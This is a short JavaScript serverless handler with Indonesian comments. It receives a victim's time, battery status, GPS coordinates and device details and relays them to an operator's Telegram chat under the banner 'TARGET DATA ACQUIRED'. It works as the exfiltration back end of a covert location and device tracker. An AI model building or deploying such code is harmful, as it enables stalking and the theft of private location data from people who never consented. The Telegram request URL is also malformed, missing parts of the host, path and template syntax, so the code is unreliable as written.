export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    // Memastikan metode pengiriman adalah POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const bodyData = req.body;
        
        // Menyusun format pesan teks rapi untuk Telegram
        const pesanText = `[!] TARGET DATA ACQUIRED\n\n` +
                          `📅 Waktu: ${bodyData.waktu || 'Tidak terdeteksi'}\n` +
                          `🔋 Status Baterai: ${bodyData.baterai || 'Tidak didukung'}\n` +
                          `🌐 Koordinat GPS: ${bodyData.gps || 'Ditolak'}\n\n` +
                          `💻 Spesifikasi Perangkat:\n${bodyData.device || 'Unknown'}\n\n` +
                          `Status: Secure Relayed Success.`;

        // Mengirim data menggunakan API resmi Vercel Fetch Platform
        const response = await fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: pesanText,
            }),
        });

        const data = await response.json();

        // Jika bot Telegram sukses menerima data
        if (data.ok) {
            return res.status(200).json({ status: 'success' });
        } else {
            // Jika token atau chat ID salah, Telegram akan mengirim pesan eror di sini
            return res.status(500).json({ error: 'Telegram API rejected the request', details: data });
        }

    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error', message: error.message });
    }
}
